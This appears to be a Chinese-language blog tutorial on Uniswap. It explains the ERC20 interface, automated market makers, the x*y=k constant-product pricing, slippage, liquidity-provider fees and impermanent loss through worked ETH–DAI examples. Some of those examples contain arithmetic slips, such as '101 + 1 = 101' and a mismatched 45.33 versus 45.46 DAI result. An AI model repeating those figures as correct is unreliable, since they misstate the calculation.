<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/b8bb006a5b68">https://www.jianshu.com/p/b8bb006a5b68</a></li>
<li><a href="https://link.zhihu.com/?target=https://medium.com/coinmonks/solidity-tx-origin-attacks-58211ad95514">https://medium.com/coinmonks/solidity-tx-origin-attacks-58211ad95514</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/qq_34611579/article/details/85163326">https://blog.csdn.net/qq_34611579&#x2F;article&#x2F;details&#x2F;85163326</a></li>
</ol>
<h1 id="区块链技术15-uniswap简介"><a href="#区块链技术15-uniswap简介" class="headerlink" title="区块链技术15:uniswap简介"></a>区块链技术15:uniswap简介</h1><p>为吸引注意力，先看一个数据：</p>
<p>从2020年3月1日到3月25日，Uniswap上的总交易规模大约2.06亿美元，这期间流动性提供商大约捕获了60多万美元的费用价值。其中3月12日和3月13日交易量都超过3,000万美元，贡献三分之一的收益，平均下来，每天大约可以产出24,000美元的收益。假设这是日均的费用，那么，所有流动性提供商一年可以赚取876万美元收益。</p>
<hr>
<p>Uniswap是一种基于以太坊的协议，旨在促进ETH和ERC20 代币数字资产之间的自动兑换交易。</p>
<p>首先讨论下，第一，以太坊上可以挖出以太币eth，人们出于各种投资&#x2F;部署以太坊智能合约&#x2F;运行智能合约，会用现实中的钱去购买以太币。第二，以太坊上还有很多种代币，以太坊代币是内置在以太坊区块链上的数字资产。它们受益于以太坊现有的基础设施，而不需要开发者重新构建全新区块链。它们还通过以太币（以太坊的本地货币，被用来驱动智能合约）来加强以太坊生态系统。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233117.jpg" alt="img"></p>
<p>利用以太坊的智能合约可以轻松编写出属于自己的代币，代币可以代表任何可以交易的东西，如：积分、财产、证书等等。因此不管是出于商业，还是学习的目的，很多人想创建一个自己的代币，看看创建的代币是什么样子。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233118.jpg" alt="img"></p>
<p>ERC20 Token</p>
<p>ERC20 和代币经常一同出现， ERC20 是以太坊定义的一个代币标准。定义了在实现代币的时候必须要遵守的协议，如指定代币名称、总量、实现代币交易函数等，只有支持了协议才能被以太坊钱包支持。<br>其接口如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">contract ERC20Interface &#123;</span><br><span class="line"></span><br><span class="line">    string public constant name = &quot;Token Name&quot;;</span><br><span class="line">    string public constant symbol = &quot;SYM&quot;;</span><br><span class="line">    uint8 public constant decimals = 18;  // 18 is the most common number of decimal places</span><br><span class="line"></span><br><span class="line">    function totalSupply() public constant returns (uint);</span><br><span class="line">    function balanceOf(address tokenOwner) public constant returns (uint balance);</span><br><span class="line">    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);</span><br><span class="line">    function transfer(address to, uint tokens) public returns (bool success);</span><br><span class="line">    function approve(address spender, uint tokens) public returns (bool success);</span><br><span class="line">    function transferFrom(address from, address to, uint tokens) public returns (bool success);</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint tokens);</span><br><span class="line">    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单说明一下：<br>name ： 代币名称<br>symbol： 代币符号<br>decimals： 代币小数点位数，代币的最小单位， 18 表示我们可以拥有 .0000000000000000001 单位个代币。<br>totalSupply() : 发行代币总量。<br>balanceOf(): 查看对应账号的代币余额。<br>transfer(): 实现代币转账交易，用于给用户发送代币（从我们的账户里）。<br>transferFrom(): 给被授权的用户使用，他可以从我们（参数 from）的账户里发送代币给其他用户（参数 to）。<br>allowance(): 返回授权花费的代币数。<br>approve(): 授权用户可代表我们花费的代币数。</p>
<p>那么为什么会出现uniswap这样的协议来支持ETH和各种代币进行自动兑换呢？</p>
<p>举一个兑换外币的例子，兑换外币有可能是出国&#x2F;购物需要使用，也有可能出于获利的目的。比如2018年4月份人民币汇率是6.3，也即可以用630元兑换100美元。到2019年10月人民币汇率是7.1，可以用手中的100美元兑换710元人民币，相当于就赚了70元人民币。也即，2018年4月用人民币买美元，2019年10月再用美元买人民币，进行两种货币之间的交换。相反，如果到2020年5月人民币又跌回了6.3，那么在2019年的时候用100美元买到710人民币，然后在2020年的时候把710人民币换成113美元，就赚到了13美元。</p>
<p>这就是两种货币交易的例子。这种交易可以发生在银行或者交易所。虽然国内银行规定进行购汇的时候不需要任何手续费，但是把外汇货币卖给银行，会按银行的“买入价”计算，从银行买外汇，则按银行规定的“卖出价”算。当中存在一个差价，这个差价相当于银行的手续费。交易所的三个经典设计模型是订单簿模型、自动化做市模型和荷兰式拍卖模型。这里还有一些概念，如订单簿、挂单、限价委托等等。</p>
<p>在中心化交易所中，手续费相对盈利而言，一般不低，因此，当区块链出现之后，去中心化交易所（DEX）正在成为一种新的解决方案。2019年时，已有了不少基于区块链的去中心化交易所，不少的去中心化交易所都是基于订单簿。订单簿包含了代币的买单和卖单列表。买单称为出价（bid），卖单称为要价（ask）。订单簿列出了在每个价格点出价或要价的代币数量。最高出价（买一）和最低要价（卖一）被称作买卖一（top of the book）。它们标志着市场情绪以及获得订单所需的买入价和卖出价。最高出价和最低要价之间的差异叫价差（spread）。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233119.jpg" alt="img"></p>
<p><em>DDEX 的订单簿</em></p>
<p>目前，IDEX、DDEX、Radar Relay、EtherDelta、Paradex 和 Ethfinex 都是订单簿式 DEX。在订单簿式去中心化交易所（以下简称订单簿式 DEX）中，可以提交两种类型的订单：市价订单和限价订单。</p>
<p>提交市价订单时，可以设定买入&#x2F;卖出的代币数量，DEX 会立即以最优市场价执行你的市价单。下一个市价单意味着，优先保证订单成交速度，无论订单簿上现有订单价格是多少。执行市价单的方式是，为买家匹配现有的卖一订单，为卖家匹配现有的买一订单。</p>
<p>提交限价订单时，DEX 会以设定的价格和数量买入或卖出代币，如果当前没有能与之匹配的订单，则该订单会被挂在订单簿上，等待交易。</p>
<p>订单簿可以存储在链上或链下。链下的订单簿式交易所（例如 0x）需要 Relayer （指的是采用此交易协议的 DEX）将订单簿存储在中心化服务器上。而链上的订单簿式交易所不需要中心化服务器，但用户需要自己创建交易并为挂单和取消订单的操作支付 gas 费用，即使订单没有被成交，gas 费也无法退还。</p>
<p>在订单簿式交易所中，做市商通过挂单来提供流动性，这些订单可以减少价差并补偿库存风险。通常，交易量越低，价差越大，因为做市商承担的流动性匮乏的风险更大。</p>
<p><em>优点</em></p>
<p>适合流动性市场。一个订单簿交易所的交易量越大、价差越小，证明一个交易所的流动性越好。在高流动性市场中，订单簿式交易所最适合于显示市场价格，并且大额订单不受价格滑点影响。Coinbase 和币安等大型中心化交易所、以及纽约证券交易所等传统交易所都依赖于订单簿模式。</p>
<p><em>缺点</em></p>
<p>不适合缺乏流动性的市场。只有当出价和要价相匹配时，订单才会被完成，反之亦然；如果订单的最高出价仍然低于最低要价，那么将无法进行交易。因此，对于流动性不足的市场，订单簿交易所将导致大额差价，交易成功率低，而且小量资金即可对市场价格造成巨大影响。</p>
<p>矿工抢先交易 (front-running)。部分链上订单簿式交易所面临着矿工与交易者之间的抢先交易问题。</p>
<p>矿工可以在交易被区块打包之前就看到所有交易。如果你下了一个大买单，一旦矿工看到这个订单，他们发现你的订单已经大到足以拉高代币价格，那么矿工便可以自己创建一个买单并把自己的买单在你之前添加到区块中。当这个区块被挖出，相当于这个矿工低价买入了代币，然后代币价格被大单拉高。矿工再高价卖出这个代币，就能无风险套利。</p>
<hr>
<p>Uniswap是DeFi中最著名的协议之一，完全部署在链上，任何个人用户，只要安装了去中心化钱包软件（当前已经支持的钱包包括 MetaMask、WalletConnect、Coinbase Wallet、Fortmatic、Portis），都可以使用这个协议。Uniswap协议的设计结构体系与传统数字资产交易所中的交易模型完全不同。大多数传统交易所都是通过维护一个“订单簿”，来匹配一种数字资产的买卖双方。Uniswap则是利用储备金流动性来实现协议上的数字资产交易兑换。Uniswap本质是一个自动化做市商（AMM），它舍弃了传统订单薄的撮合方式，采用流动池加恒定乘积公式算法(x*y &#x3D; k )为不同加密资产提供即时报价和兑换服务。 </p>
<p><strong>什么是Uniswap</strong></p>
<p>关于什么是Uniswap，先看一下Uniswap白皮书中的定义：</p>
<p>Uniswap is a protocol for automated token exchange on Ethereum. It is designed around ease-of-use, gas efficiency, censorship resistance, and zero rent extraction. </p>
<p>Uniswap是一个基于以太坊的自动代币交换协议，它的设计目标是：易用性、gas高利用率、抗审查性和零抽租。 </p>
<ul>
<li><p>ease-of-use（易用性）：Token A换Token B，在Uniswap也只要发出一笔交易就能完成兑换，在其它交易所中可能需要发两笔交易：第一笔将Token A换成某种媒介货币，如ETH, D<a href="https://link.zhihu.com/?target=http://jizhid.com/number/ai/">AI</a> 等，然后再发第二笔交易换成Token B。 </p>
</li>
<li><p>gas efficiency（gas高利用率）：在Uniswap上消耗的gas量是以太坊上的几家主流去中化交易所中最低的，也就代表在Uniswap交易要付的矿工费最少。</p>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233120.jpg" alt="img"></p>
<ul>
<li>censorship resistance（抗审查性）：抗审查性体现在Uniswap上架新Token没有门槛，任何人都能在Uniswap上架任何Token。这在去中心交易所中很少见，虽然大多数的去中心化交易所不会像中心化交易所收取上币费，但还是需要提交上币申请，通过审查后运营团队才会让Token可以在他们的交易所上交易。下面是各去中心化交易所上币规则的详情：</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">KyberSwap上币规则：https://developer.kyber.network/docs/Reserves-ListingProcess/</span><br><span class="line">EtherDelta上币规则：https://steemit.com/cryptocurrency/@mindseye69/new-etherdelta-coin-listing-rules</span><br><span class="line">IDEX上币规则：https://medium.com/@forrestwhaling/idex-token-listing-guidelines-eae00785fdd2</span><br><span class="line">Uniswap上币规则：https://uniswap.org/docs/v1/frontend-integration/token-listing/</span><br></pre></td></tr></table></figure>

<ul>
<li>zero rent extraction（零抽租）:在Uniswap协议设计中，开发团队不会从交易中抽取费用，交易中的所有费用都归还给流动性提供者。</li>
</ul>
<p>上面的介绍中又有两个新名词：AMM automated market maker，自动化做市商；流动性提供者。</p>
<h2 id="自动化做市商-AMM"><a href="#自动化做市商-AMM" class="headerlink" title="自动化做市商(AMM)"></a>自动化做市商(AMM)</h2><p>传统的交易所有一个订单薄(Order Book)，订单薄上记录着买卖方向，数量和出价，交易所负责对买卖双方进行配对，一旦订单薄中最高价格低于或等于最低价格，就会促成交易，同时会产生一个新的成交价，传统交易所有以下特点：</p>
<ul>
<li>市场上必须要有用户进行挂单，要有一定量的订单（市场流动）。</li>
<li>订单必须重叠才能成交，即买价高于或等于卖价。</li>
<li>需要将资产存储在交易所。</li>
</ul>
<p>在订单薄模型市场中，买家期望用最低的价格买到想要的资产，而卖家则是期望用最高价格卖出同一项资产，如果交易要成立，买卖双方必须要在价格上达成共识，一是买家提高出价，而是卖家降低出价，如果双方都不要改变出价，这时候就要依靠做市商的参与，简单来说，做市商是一个促进交易的实体，它会在买卖两个方向上挂单，让想要交易的参与方只要跟做市商的订单撮合就能完成交易，而不需要等待对手方出现才能交易，极大的提高了市场的流动性。</p>
<p>为什么Uniswap不采用订单薄模型？</p>
<p>Uniswap部署在以太坊上，而以太坊每秒可以出来15笔左右的交易，这对于订单薄交易所来不可行，主要原因是：“订单薄模型依赖一个或多个外部做市商对某项资产一直不断的做市，而以太坊的TPS过低不支持做市商高频的交易，如果缺少了做市商，那么交易所的流动性立刻会降低，对于用户来说这样的交易所体验很差。”</p>
<p>Uniswap采用流动池加恒定乘法公式这种自动化做市商（AMM）模式实现了资产的交换，自动化做市商模式方式不需要买卖双方进行挂单，也不要买卖双方的订单重叠，可以进行自由买卖。</p>
<ul>
<li>流动池：使用流动池来提供买卖双方交易，做市商只要把资金放入流动池即可</li>
<li>恒定乘法公式：按照流动池中Token的数量，自动计算买卖价格</li>
</ul>
<h3 id="流动池"><a href="#流动池" class="headerlink" title="流动池"></a><strong>流动池</strong></h3><p>流动池就是锁定在智能合约中所有的代币以及资金的总称，流动是资金转为代币，或代币转为资金的意思。</p>
<p>一个完整的流动池分为2个部份，分别表示不同的货币，成为一个交易对，在Uniswap V1中就是ETH及ERC20代币，在Uniswap V2中是支持不同ERC20代币直接交换，所以在Uniswap V2中的流动池可以允许两边是不相同的ERC20代币，其中ETH会自动转换成以WETH代币。为了简化，直接以ETH-ERC20交易对作为例子。</p>
<p>如下图所示，Uniswap将所有做市商的ETH集合在一起放在流动池左边， 将所有ERC20集合在一起放在流动池的右边。如果有用户要买ERC20代币，就从流动池的右边将ERC20代币转给用户，同时将用户支付的ETH添加的流动池的左边，然后重新计算流动池中的价格，等待下次交易。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233121.jpg" alt="img"></p>
<p><strong>恒定乘积公式</strong></p>
<p>Uniswap用来确定token交易汇率的恒定乘积公式，最初来源自2018年3月Vitalik Buterin发表过的一篇文章中。此文中表述，根据以下公式来计算ERC20代币的交易汇率：</p>
<p>x*y &#x3D; k</p>
<p>k 表示一个不变的常数；x 和 y 表示特定交易对中ETH和ERC20代币的可用数量。</p>
<p>对于Uniswap而言，则是该ERC20代币和ETH的交易合约中ETH和该ERC20代币的流动性池的储备量。在这个公式中，该ERC20代币和ETH的兑换汇率，将始终处于此公式结果曲线上的某一点。</p>
<p>这个公式是Uniswap协议的组成部分，Vitalik Buterin使用下面这个图来对其进行描述：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233122.jpg" alt="img"></p>
<p>使用此公式，如果以Uniswap中的交易合约举例，则代表该交易合约储备有 x 数量的A代币和 y 数量的B代币。这个合约将始终保持乘积恒定，也就是说 x * y 得到的 k 值不变。</p>
<p>任何人都可以通过有效改变做市商在 x* y 曲线上的位置来进行买入或者卖出代币。</p>
<p>横轴代表卖出的A代币的数量，纵轴代表买入的B代币的数量。</p>
<p>假设B代币是ETH，而A代币是任意一种ERC20代币，我们可以通过 x * y &#x3D; k 的公式来理解一下它们的功能：</p>
<p>如果Alice决定买入大量A代币，那么将导致A代币的紧缺，并且导致ETH数量的增加。Alice购买的行为导致了把汇率移动到了 x * y &#x3D; k 曲线上的另一个点。红点将向左移动，也就是买入A代币的价格变得更加高。也可以将Uniswap的交易合约中的ETH和A代币的相对供应理解为A代币的供需关系，这种供需关系决定了A代币与ETH之间的汇率。</p>
<p>如前所述，第一个为交易合约提供流动性的充值操作，并不取决于交易汇率。而是反过来，后面的交易汇率，将取决于第一次为交易合约提供流动性的这个充值操作充值了多少ETH和ERC20代币，用第一个流动性提供者认为的等值，来反映ERC20&#x2F;ETH的兑换汇率。如果这个汇率和市场对比过高或者过低，<strong>套利交易者</strong>都会很快把差距抹平，直到市场正常水平。</p>
<p><strong>Uniswap 上的交易类型：ETH ⇄ ERC20 交易</strong></p>
<p>在Uniswap上可以进行的交易中的一种，就是ETH和ERC20代币之间的交易。就像前面提到的，这个交易对的汇率取决于此交易合约内ETH和该 ERC20代币流动性池的相对规模。这个交易汇率是由Uniswap的恒定乘积公式来决定的：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH 池 * token 池 = 恒定乘积值</span><br></pre></td></tr></table></figure>

<p>在Uniswap上执行任何交易，此恒定乘积值都保持不变。只有当此交易合约中的流动性池发生变化的时候，此恒定乘积值才会发生变化。</p>
<p>我们用 ETH ⇄ DAI（一种ERC20代币）来举例：【本例中不考虑手续费】</p>
<p>Bob想要发起交易来用自己的1个ETH兑换成ERC20代币DAI，Bob将使用 Uniswap上已经存在的DAI交易合约来实现此兑换操作。此时，流动性提供者已经将一定量的ETH和DAI存在了交易合约中。我们这里举例，流动性提供者一共存了10 ETH和500 DAI。因此，基础的恒定乘积值为：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH 池 * DAI 池 = 恒定乘积值</span><br><span class="line">ETH 池 = 10</span><br><span class="line">DAI 池 = 500</span><br><span class="line">恒定乘积值 = 500 * 10 = 5000</span><br></pre></td></tr></table></figure>

<p>Bob将通过向交易合约的ETH池发送1 ETH来启动这笔交易，该1个ETH被添加到了ETH池中。然后，恒定乘积值除ETH池中新的ETH数量，来得到DAI池中应该有的数量。那么多出来的DAI，就可以分给Bob了。具体如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Bob发送了 1 ETH</span><br><span class="line">ETH 池 = 10 + 1 = 11</span><br><span class="line">DAI 池 = 5000/11 = 454.54</span><br><span class="line">Bob 将兑换得到 : 500–454.54 = 45.46 DAI</span><br></pre></td></tr></table></figure>

<p>在这次交易中，Bob兑换的汇率为 45.46 DAI&#x2F;ETH</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1 ETH 入</span><br><span class="line">45.33 DAI 出</span><br><span class="line">汇率 = 45.46 DAI/ETH</span><br></pre></td></tr></table></figure>

<p>上面的计算过程，大家觉得有什么问题吗？可以继续计算例子来感受下【同样不考虑交易费】：</p>
<p>Bob想要再次发起交易来用自己的1个ETH兑换成ERC20代币DAI，当前的恒定乘积依然是5000：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH 池 * DAI 池 = 恒定乘积值</span><br><span class="line">ETH 池 = 11</span><br><span class="line">DAI 池 = 5000/11 = 454.54</span><br><span class="line">恒定乘积值 = 11 × 5000/11 = 5000</span><br></pre></td></tr></table></figure>

<p>重复之前的过程，这个ETH被添加到ETH池中，从而ETH池中有12个币，再次计算DAI池中应该保留的DAI币的数量。具体如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Bob发送了 1 ETH</span><br><span class="line">ETH 池 = 11 + 1 = 12</span><br><span class="line">DAI 池 = 5000/12 = 416.66</span><br><span class="line">Bob 将兑换得到 : 454.54–416.66 = 37.88 DAI</span><br></pre></td></tr></table></figure>

<p>在这次交易中，Bob兑换的汇率为 37.88 DAI&#x2F;ETH</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1 ETH 入</span><br><span class="line">37.88 DAI 出</span><br><span class="line">汇率 = 37.88 DAI/ETH</span><br></pre></td></tr></table></figure>

<p>发现了什么问题呢？DAI币的价格上涨了。在刚创建流动资产时，可以认为一个ETH可以换50个DAI，1个DAI等于0.02个ETH，则经过第一次兑换之后，1个DAI则等于0.022个以太坊，相当于有10%的价格上涨。</p>
<p>如果第二次有人再购买1ETH，这时候Uniswap只返回了37.88个DAI，相当于1 DAI&#x3D;0.0264个ETH，又上涨了20%。</p>
<p>这里介绍一个新的概念，滑点。滑点是指用户最终实现兑换的汇率偏离了真实的汇率。譬如上面Bob第一次使用ETH购入DAI时，看到池中的比例，认为自己应该获得50个DAI，但实际上只获得了 45.46个。这个时候，相当于用户承受了损失。那么如何降低滑点呢？再看一个例子。</p>
<p>假设Bob想要发起交易来用自己的1个ETH兑换成ERC20代币DAI，Bob发现此时以太坊上有两个Uniswap合约提供兑换功能。一个合约的资金池是10 ETH和500 DAI，另一个合约的资金池中流动性提供者一共存了100ETH和5000 DAI【也即此时的兑换币也是1:50】。那么Bob应该选取哪个合约进行兑换呢？上面我们已经讨论了恒定积为5000的例子，现在我们讨论下恒定积为500,000的例子。现在的基础的恒定乘积值为：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH 池 * DAI 池 = 恒定乘积值</span><br><span class="line">ETH 池 = 100</span><br><span class="line">DAI 池 = 5000</span><br><span class="line">恒定乘积值 = 5000 * 100 = 500，000</span><br></pre></td></tr></table></figure>

<p>Bob将通过向交易合约的ETH池发送1 ETH来启动这笔交易，该1个ETH被添加到了ETH池中。然后，恒定乘积值除ETH池中新的ETH数量，来得到DAI池中应该有的数量。那么多出来的DAI，就可以分给Bob了。具体如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Bob发送了 1 ETH</span><br><span class="line">ETH 池 = 101 + 1 = 101</span><br><span class="line">DAI 池 = 500，000/101 = 4950.50</span><br><span class="line">Bob 将兑换得到 : 5000–4950.50 = 49.50 DAI</span><br></pre></td></tr></table></figure>

<p>在这次交易中，Bob兑换的汇率为 49.50 DAI&#x2F;ETH</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1 ETH 入</span><br><span class="line">49.50 DAI 出</span><br><span class="line">汇率 = 49.50 DAI/ETH</span><br></pre></td></tr></table></figure>

<p>因此，从上面的例子中可以看出，当兑换金额相对于兑换池资金量过大，或者说对于一定的兑换金额，兑换池资金太少时，就会出现较大滑点。但当兑换池中的代币数量充足时，滑点的数额就会减少，而且资金越多，滑点越小。滑点的大小和常说的交易深度【<strong>交易深度</strong>是指市场在承受大额交易时币价不出现大幅波动的能力】大小相反，滑点越小，交易深度越大，用户越能够按照稳定的价格完成交易。</p>
<p>因此，为了吸引用户，Uniswap合约中需要有足够大的资金池，但是Uniswap无法自己变出钱来，因此需要依赖外部资金向合约中注入资金，以提供流动性，向Uniswap流动池中提供流动性的用户被称为流动性提供者。但是Uniswap如何吸引流动性提供者呢？</p>
<p>当流动性提供者向Uniswap中注入流动性的时候，Uniswap会铸造出一个流动性代币，铸出代币数量是与用户注入的资金所占流动池中的资金比例相关，流动性提供者可以选择在任何时间销毁自己持有的流动性代币。为了鼓励用于向Uniswap的流动池中提供更多的流动性，Uniswap会从每笔交易总额中抽取0.3%当成交易手续费，并将手续费全额交给那些将注资金到Uniswap资金池提供流动性的流动性提供者。</p>
<p>在上面的例子中，流动性提供者需要将等值的ETH以及ERC20代币充值到交易合约中。第一个向此合约中提供流动性的流动性提供者就拥有设置此ERC20代币与ETH之间兑换汇率的权利。第一个流动性提供者把自己认为等价值的ETH数量和ERC20代币数量充值到此交易合约，就可以实现设置汇率。而如果第一个流动性提供者设置的这个汇率和外面更大盘的市场不一致，那么套利交易者就会通过交易来把这些价差抹平，和大盘保持一致的汇率。此后所有流动性提供者将以其充值时的汇率作为计算等价的依据。</p>
<p>接下来再看一个例子，在有交易费用的情况下，如何影响用户的兑换率。</p>
<p>考虑资金池中有10个ETH和500个DAI的情况，Bob将通过向交易合约的ETH池发送1ETH来启动交易，此时，交易金额的0.3%也就是0.003ETH将被扣除作为给流动性提供者的报酬。剩余的0.997ETH则被添加到了ETH池里面。然后，恒定乘积值除ETH池中新的ETH数量，来得到DAI池中应该有的数量。那么多出来的DAI，就可以分给Bob了。具体如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Bob发送了 1 ETH</span><br><span class="line">费用 = 0.003 ETH</span><br><span class="line">ETH 池 = 10 + (1–0.003) = 10.997</span><br><span class="line">DAI 池 = 5000/10.997 = 454.67</span><br><span class="line">Bob 将兑换得到 : 500–454.67 = 45.33 DAI</span><br></pre></td></tr></table></figure>

<p>在Bob开始交易时收取的流动性提供者费用，现在又重新添加到ETH流动池里面。这是对流动性提供者的一种报酬，当这些流动性提供者从流动池中取回自己的ETH和ERC20代币时，可以获得这些报酬【也即当LP退出的时候，才真正拿走】。由于这些流动性提供者的报酬是在上述兑换交易计算后才添加回ETH流动池里面，因此在交易合约上每执行一次交易，恒定乘积值就会增加一点，这就让流动性提供者为交易合约提供流动性这件事儿，成为一种有利可图的行为。这笔交易完成后，</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH 池 = 10.997 + 0.003 = 11</span><br><span class="line">DAI 池 = 454.67</span><br><span class="line">新的恒定乘积值 = 5,001.37</span><br></pre></td></tr></table></figure>

<p>在这次交易中，Bob兑换的汇率为 45.33 DAI&#x2F;ETH</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1 ETH 入</span><br><span class="line">45.33 DAI 出</span><br><span class="line">汇率 = 45.33 DAI/ETH</span><br></pre></td></tr></table></figure>

<p>可以看出，相比于没有手续费的情况，Bob的兑换率是降低了；同时，恒定乘积值变大了。多出来的部分实际上就是流动性提供者的报酬。如果此时流动性提供者退出，那么就会拿走报酬，同时因为资金池中相应比率的资金的减少，恒定乘积会降低。</p>
<p>看公式，相当于是对之前例子的抽象。</p>
<p>不考虑手续费的计算公式：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233123.jpg" alt="img"></p>
<p>对于不理解上面公式的同学，可以参考以下表格中的数据自己在excel中手动演算一遍，可以更直观的理解Uniswap的工作原理。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233124.jpg" alt="img"></p>
<p>加入手续费的恒定乘积公式：以下过程是在计算手续费的情况下，将上面的公式重新推导了一遍。计算交易价格 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233125.jpg" alt="img"></p>
<p>上面的公式中， $\alpha$ 是真实的买家的付出的比例；但是在计算y值的时候，去除了手续费，因此，得到更多的y值。也即</p>
<p>$(1+\alpha)*(1-\beta)&#x3D;1$</p>
<p>变成了$(1+\alpha\gamma)(1-\beta)&#x3D;1$ </p>
<p>所以， $\alpha$和$\beta$  的关系就从</p>
<p>$\alpha&#x3D;\frac{\beta}{1-\beta}$</p>
<p>变成了</p>
<p>$\alpha&#x3D;\frac{\beta}{1-\beta}\frac{1}{\gamma}$</p>
<p>k除了在有交易手续费的情况会变大，还有一个情况也会使k值产生变化，当向流动池中增加流动性的时候k会变大，当从流动池中取回流动资金时k会变小。具体变化比例可以参考Uniswap白皮书。 </p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233126.jpg" alt="img"></p>
<hr>
<p>接下来，讨论下，流动性提供者提供资金时的比例和影响。因为恒定乘积公式的K越大，也就是资金池里的资金越多时，代币交换滑点越小，流动性也就越好。所以，AMM模式鼓励用户为兑换资金池提供流动性，方式就是用户向流动性资金池中存入等价值的2种代币，比如上面例子里，用户同时存入10个ETH 和500个DAI，得到20个ETH和1000个DAI，此时能够位置ETH和DAI的比例。如果用户存入的2种代币不等值，比如他存入了10个ETH和50个DAI，（此时的市价还是1个ETH换50个DAI）这会造成兑换池里ETH的供给相对过剩，ETH和DAI的相对价值就出现了不平衡，此时池中的供应量是20个ETH和550个DAI。相当于一个ETH只能换27.5个DAI。此时套利者就可以在外部购入DAI，然后在该合约中兑换ETH，从而进行获利。</p>
<p>可以来计算一下，此时资金池中共有</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ETH 池 = 20</span><br><span class="line">DAI 池 = 550</span><br><span class="line">新的恒定乘积值 = 20 * 550 = 11000 </span><br></pre></td></tr></table></figure>

<p>套利者此时可以使用DAI来兑换ETH。此时，套利者可以向合约中存入191.6个DAI，来兑换相应的ETH。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">套利者发送了 191.6 DAI</span><br><span class="line">DAI 池 = 550 + 191.6 =741.6</span><br><span class="line">ETH 池 = 11000 / 741.6 = 14.83</span><br><span class="line">Bob 将兑换得到 : 20–14.83 = 5.17 ETH</span><br><span class="line"></span><br><span class="line">套利者获利</span><br><span class="line">5.17 - 191.6/50 = 5.17 - 3.832 = 1.338 ETH </span><br><span class="line">资金池恢复平衡</span><br><span class="line">741.6 / 14.83 = 50</span><br></pre></td></tr></table></figure>

<p>套利者如何计算得出应该存入191.6个DAI呢？</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">（550 + x） * (20 - y) = 11000</span><br><span class="line"> (550 + x) / (20 - y) = 50</span><br></pre></td></tr></table></figure>

<p>上面讨论了Uniswap通过给流动性提供者的奖励，也即交易所的手续费，手续费率为0.3%，流动性提供者之间依据存入资金的份额按比例分配。加入一天的成交额是40.85亿CNY，那么一天的手续费就有122万元，经过一段时间的积累，流动性提供者（LP）得到的手续费奖励金额就非常可观了。Uniswap会根据流动性提供者存入资金的数额发给他们一定数量的LP token，我们可以理解为存款奖状或者收据，它是LP获得交易所手续费奖励的凭证。</p>
<p>举个例子具体说明：假设这个交易对是ETH–DAI，目前兑换比例是1ETH–50DAI。我向资金池充了1ETH和50DAI，这个资金池发给我1个LP token，代表我有1份（ETH–DAI）的流动性贡献。这个资金池所产生的手续费进入一个pool，经过一段时间后，pool中共有积累的手续费A个ETH和B个DAI，当我把我的1个LP token交还给Uniswap时，我有权利从pool拿走它按比例对应的手续费。假设此时整个资金池共发出了X个LP token，我的流动性贡献占比就是1&#x2F;X，我就可以获得A&#x2F;X个ETH和B&#x2F;X个DAI【手续费】，然后再赎回我的1ETH和50DAI。</p>
<p>Uniswap通过AMM模式和为流动性提供者奖励手续费的模式，极大地调动了LP的积极性。由于任何人都可以提供流动性并且从中获利，人们有动力为Uniswap提供流动性；交易所获得充足的交易流动性，交易滑点就小，用户体验也好。交易所的运行完全基于市场的需求进行。人工的运维成本大幅降低。</p>
<p>在Uniswap中，交易产品的挂牌会是免费的。而且由于不需要再用交易订单的模式，而且流动性也不需要专门的做市商来提供，因此目前证券市场中的做市商的成本就可以取消。降低了上币成本和做市成本，Uniswap对DeFi和整个区块链行业的发展起到了一定的促进作用。</p>
<p>但是，作为流动性提供者，虽然为Uniswap提供流动性可以交易手续费，但也存在无常损失。无偿损失是指流动性提供者按当时的市价存入2种代币，在他要取出这些代币时，它们的兑换价格发生了变化而导致的损失。如果这2种代币中某个代币大幅上涨或下跌都可能导致无常损失。注意，不管涨还是跌，都有可能导致损失。</p>
